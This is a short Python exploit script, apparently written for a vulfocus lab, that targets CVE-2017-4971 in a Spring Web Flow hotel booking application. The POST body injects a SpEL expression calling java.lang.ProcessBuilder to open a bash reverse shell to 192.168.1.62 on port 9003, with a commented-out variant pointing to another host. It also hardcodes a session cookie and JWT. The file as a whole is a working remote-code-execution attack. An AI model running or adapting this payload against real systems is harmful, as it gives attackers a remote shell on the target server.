'''
Author: yhh
Date: 2022-09-06 21:03:05
LastEditTime: 2022-09-07 13:31:57
LastEditors: yhh
Description: 
FilePath: \PythonFile\spring.py
yhh
'''
import requests
import os

def post_spring(socket,file_path):
    headers = {
        "Host": "192.168.1.221:8080",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "171",
        "Origin": "http://192.168.1.221:8080",
        "Connection": "close",
        "Referer": "http://192.168.1.221:8080/hotels/booking?execution=e2s2",
        "Cookie": "vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjYyNzA2NzY3LCJlbWFpbCI6IiJ9.eNP10YKyOelyrYpLSKpvnPFLK4dJ5N3FX_93gjW-yS8; JSESSIONID=1C34A8703EBA1BF1370E0AE515A9A5A7",
        "Upgrade-Insecure-Requests": "1"
    }

    url = f"http://{socket}/hotels/booking?execution=e2s2"   #fstring
    file_path = os.path.join(os.path.dirname(__file__), file_path)
    #data = '_eventId_confirm=&_csrf=b843f63d-4138-4aab-a72a-9a0290746ba6&_(new+java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/100.1.1.121/8000+0>%261")).start()=vulfocus'
    data = '_eventId_confirm=&_csrf=d7746c67-96e0-4301-ac5c-1637b8c2f758&_(new+java.lang.ProcessBuilder("bash","-c","bash+-i+>%26+/dev/tcp/192.168.1.62/9003+0>%261")).start()=vulfocus'
    try:
        r = requests.post(url,headers=headers,data=data)
        # 将返回的数据写入文件(覆盖)

        with open(file_path, "w") as f:
            f.write(r.text)
        #print(r.text)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    post_spring("192.168.1.221:8080",'responseCVE2017-4971.html')